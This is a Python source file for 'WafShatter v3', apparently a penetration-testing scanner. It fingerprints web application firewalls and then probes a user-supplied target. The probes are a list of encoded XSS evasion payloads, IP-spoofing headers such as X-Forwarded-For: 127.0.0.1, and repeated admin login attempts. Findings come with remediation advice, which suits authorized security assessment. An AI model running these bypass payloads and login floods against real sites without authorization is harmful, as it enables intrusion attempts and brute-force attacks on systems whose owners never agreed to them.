#!/usr/bin/env python3
"""WafShatter v3 — fixes: proxy support, confidence floor, 403 clarification."""
import asyncio
import aiohttp
import json
import re
import sys
import random
from pathlib import Path
from urllib.parse import urlparse, quote

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    build_baseline_404, delay, confidence_score, confidence_label,
    severity_from_confidence, detect_waf, REQUEST_DELAY,
    is_truly_accessible, meets_confidence_floor, random_ua
)

WAF_PROFILES = {
    "Cloudflare":    {"headers":["cf-ray","cf-cache-status","__cfduid"],"body":["cloudflare","cf-ray"],"status":[403,503]},
    "Akamai":        {"headers":["x-check-cacheable","x-akamai-transformed"],"body":["akamai"],"status":[403]},
    "Imperva":       {"headers":["x-iinfo","incap-ses"],"body":["incapsula","request unsuccessful"],"status":[403]},
    "AWS WAF":       {"headers":["x-amzn-requestid","x-amzn-trace-id"],"body":["request blocked"],"status":[403]},
    "Sucuri":        {"headers":["x-sucuri-id","x-sucuri-cache"],"body":["sucuri"],"status":[403]},
    "F5 BIG-IP":     {"headers":["x-wa-info"],"body":["the requested url was rejected"],"status":[403]},
    "Barracuda":     {"headers":["barra_counter_session"],"body":["barracuda"],"status":[403]},
    "ModSecurity":   {"headers":["mod_security","x-waf-status"],"body":["mod_security","not acceptable"],"status":[406,403]},
    "Wordfence":     {"headers":[],"body":["wordfence"],"status":[403,503]},
    "Fortinet":      {"headers":["x-fw-type"],"body":["fortigate"],"status":[403]},
    "Fastly":        {"headers":["x-served-by"],"body":["fastly"],"status":[503]},
    "Varnish":       {"headers":["x-varnish","via"],"body":["varnish cache server"],"status":[503]},
    "Radware":       {"headers":["x-rdwr-pop"],"body":["radware"],"status":[403]},
    "Azure Front":   {"headers":["x-azure-ref"],"body":["azure"],"status":[403]},
    "DataDome":      {"headers":["x-datadome-isbot"],"body":["datadome"],"status":[403]},
    "PerimeterX":    {"headers":["_px"],"body":["perimeterx"],"status":[403]},
    "DDoS-Guard":    {"headers":["ddos-guard"],"body":["ddos-guard"],"status":[403]},
}

BYPASS_PAYLOADS = [
    ("case_variation",   "<ScRiPt>alert(1)</sCrIpT>"),
    ("url_encoded",      "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"),
    ("double_encoded",   "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E"),
    ("html_entity",      "&#60;script&#62;alert(1)&#60;/script&#62;"),
    ("unicode_escape",   "\u003cscript\u003ealert(1)\u003c/script\u003e"),
    ("null_byte",        "<sc\x00ript>alert(1)</script>"),
    ("comment_inject",   "<s/**/cript>alert(1)</script>"),
    ("svg_vector",       "<svg onload=alert(1)>"),
    ("img_onerror",      "<img src=x onerror=alert(1)>"),
    ("js_protocol",      "javascript:alert(1)"),
    ("fromcharcode",     "<script>alert(String.fromCharCode(49))</script>"),
    ("newline_inject",   "<scri\npt>alert(1)</script>"),
    ("tab_inject",       "<scri\tpt>alert(1)</script>"),
    ("data_uri",         "data:text/html,<script>alert(1)</script>"),
]

IP_SPOOF_HEADERS = ["X-Forwarded-For","X-Real-IP","X-Originating-IP","X-Remote-IP","CF-Connecting-IP","True-Client-IP"]

class WafShatter:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.findings = []
        self.waf_name = None
        self.baseline_404 = ""

    async def _get(self, sess, url, headers=None):
        try:
            async with sess.get(url, headers=headers or {}, ssl=False,
                                timeout=aiohttp.ClientTimeout(total=10),
                                allow_redirects=False) as r:
                return r.status, await r.text(errors='ignore'), dict(r.headers)
        except Exception:
            return None, None, {}

    async def _post(self, sess, url, data=None, headers=None):
        try:
            async with sess.post(url, data=data, headers=headers or {}, ssl=False,
                                 timeout=aiohttp.ClientTimeout(total=10)) as r:
                return r.status, await r.text(errors='ignore'), dict(r.headers)
        except Exception:
            return None, None, {}

    async def fingerprint_waf(self, sess):
        print("\n[*] Fingerprinting WAF/CDN...")
        s_normal, b_normal, h_normal = await self._get(sess, self.target)
        await delay()
        s_xss, b_xss, h_xss = await self._get(sess, f"{self.target}/?q=<script>alert(1)</script>")
        await delay()
        detected = []
        for waf_name, profile in WAF_PROFILES.items():
            score = 0
            all_hdr_str = " ".join(f"{k} {v}" for k,v in {**h_normal,**h_xss}.items()).lower()
            all_body    = ((b_normal or '') + (b_xss or '')).lower()
            for h in profile["headers"]:
                if h in all_hdr_str: score += 2
            for bs in profile["body"]:
                if bs.lower() in all_body: score += 2
            if s_xss in profile["status"]: score += 1
            if score >= 2: detected.append((waf_name, score))

        if detected:
            detected.sort(key=lambda x: -x[1])
            self.waf_name = detected[0][0]
            conf = min(95, 60 + detected[0][1] * 5)
            if meets_confidence_floor(conf):
                self.findings.append({
                    'type':'WAF_DETECTED','severity':'INFO','confidence':conf,
                    'confidence_label':confidence_label(conf),
                    'waf':[n for n,_ in detected],'primary_waf':self.waf_name,
                    'detail':f"WAF/CDN detected: {self.waf_name}",
                    'remediation':"WAF presence is good. Ensure it is properly tuned and rules are updated regularly.",
                })
            print(f"  [+] WAF detected: {', '.join(n for n,_ in detected)}")
            return True
        else:
            self.findings.append({
                'type':'NO_WAF_DETECTED','severity':'MEDIUM','confidence':70,
                'confidence_label':'Medium',
                'detail':"No WAF/CDN detected — target appears directly exposed to the internet",
                'remediation':"Consider adding a WAF (Cloudflare, AWS WAF, ModSecurity) to filter malicious traffic.",
            })
            print("  [+] No WAF detected")
            return False

    async def test_bypass_payloads(self, sess):
        print("\n[*] Testing WAF bypass techniques...")
        s_block, _, _ = await self._get(sess, f"{self.target}/?q=<script>alert(1)</script>")
        await delay()
        is_blocked = s_block in [403, 406, 429, 503] or self.waf_name is not None
        if not is_blocked:
            print("  [!] Baseline not blocked — bypass testing skipped (no WAF to bypass)")
            return
        bypassed = []
        for name, payload in BYPASS_PAYLOADS:
            url = f"{self.target}/?q={quote(payload, safe='')}"
            s, b, _ = await self._get(sess, url)
            await delay()
            if s not in [403, 406, 429, 503, None]:
                bypassed.append({'technique':name,'payload':payload,'status':s})
                print(f"  [HIGH] Bypass confirmed: {name} (status {s})")
        if bypassed:
            conf = min(95, 70 + len(bypassed)*5)
            if meets_confidence_floor(conf):
                self.findings.append({
                    'type':'WAF_BYPASS_CONFIRMED','severity':severity_from_confidence('HIGH',conf),
                    'confidence':conf,'confidence_label':confidence_label(conf),
                    'waf':self.waf_name,'bypasses':bypassed,'bypass_count':len(bypassed),
                    'proof':f"{len(bypassed)} bypass technique(s) confirmed: {[b['technique'] for b in bypassed]}",
                    'detail':f"{len(bypassed)} WAF bypass technique(s) confirmed against {self.waf_name or 'WAF'}",
                    'remediation':"Update WAF rules to PCRE/allowlist-based patterns. Test WAF config regularly with OWASP CRS.",
                })
        else:
            print(f"  [+] All tested bypass techniques blocked by {self.waf_name or 'WAF'}")

    async def test_ip_spoof_bypass(self, sess):
        print("\n[*] Testing IP spoof header bypass...")
        s_block, _, _ = await self._get(sess, f"{self.target}/?q=<script>alert(1)</script>")
        await delay()
        if s_block not in [403, 406, 429, 503]:
            return
        for header in IP_SPOOF_HEADERS:
            for ip in ['127.0.0.1','10.0.0.1']:
                s, b, _ = await self._get(sess, f"{self.target}/?q=<script>alert(1)</script>",
                                          headers={header: ip})
                await delay()
                if s not in [403, 406, 429, 503, None]:
                    if meets_confidence_floor(85):
                        self.findings.append({
                            'type':'WAF_IP_SPOOF_BYPASS','severity':'HIGH','confidence':85,
                            'confidence_label':'High','header':header,'value':ip,'status':s,
                            'proof':f"WAF blocked direct request but allowed {header}: {ip} (HTTP {s})",
                            'detail':f"WAF bypassed with {header}: {ip}",
                            'remediation':"Do not trust X-Forwarded-For for access control. Use actual TCP connection IP.",
                        })
                        print(f"  [HIGH] IP spoof bypass: {header}: {ip}")
                        return

    async def test_rate_limit(self, sess):
        print("\n[*] Testing rate limiting on login endpoint...")
        url = self.target + '/api/auth/login'
        statuses = []
        for i in range(20):
            s, _, _ = await self._post(sess, url, data=f"username=admin&password=test{i}",
                                       headers={"Content-Type":"application/x-www-form-urlencoded"})
            await asyncio.sleep(0.08)
            if s: statuses.append(s)
            if s in [429, 423, 503]:
                print(f"  [+] Rate limiting active after {i+1} requests (HTTP {s})")
                return
        if statuses and not any(s in [429,423,503] for s in statuses):
            if meets_confidence_floor(75):
                self.findings.append({
                    'type':'NO_RATE_LIMITING','severity':'HIGH','confidence':75,
                    'confidence_label':'Medium','endpoint':url,
                    'requests_sent':len(statuses),'statuses':list(set(statuses)),
                    'proof':f"Sent {len(statuses)} login requests without any 429/lockout response",
                    'detail':"No rate limiting on login endpoint — brute-force attacks possible",
                    'remediation':"Implement rate limiting (5 req/min per IP) and account lockout on authentication endpoints.",
                })
                print(f"  [HIGH] No rate limiting after {len(statuses)} requests")

    async def run(self):
        print("="*60)
        print("  WafShatter v3 — WAF Detection and Bypass Engine")
        print("  Note: 403 from WAF = protection working (not a bypass finding)")
        print("="*60)
        conn = aiohttp.TCPConnector(limit=5, ssl=False)
        async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=30),
                headers={"User-Agent": random_ua()}) as sess:
            print("[*] Building 404 baseline...")
            self.baseline_404 = await build_baseline_404(sess, self.target)
            await self.fingerprint_waf(sess)
            await self.test_bypass_payloads(sess)
            await self.test_ip_spoof_bypass(sess)
            await self.test_rate_limit(sess)
        return self.findings

def get_target():
    p = Path("reports/_target.txt")
    if p.exists(): return p.read_text().strip()
    u = input("[?] Target URL: ").strip()
    return u if u.startswith("http") else "https://" + u

def main():
    target = get_target()
    Path("reports").mkdir(exist_ok=True)
    findings = asyncio.run(WafShatter(target).run())
    with open("reports/wafshatter.json",'w') as f: json.dump(findings,f,indent=2,default=str)
    print(f"\n[+] {len(findings)} findings -> reports/wafshatter.json")

if __name__ == '__main__': main()
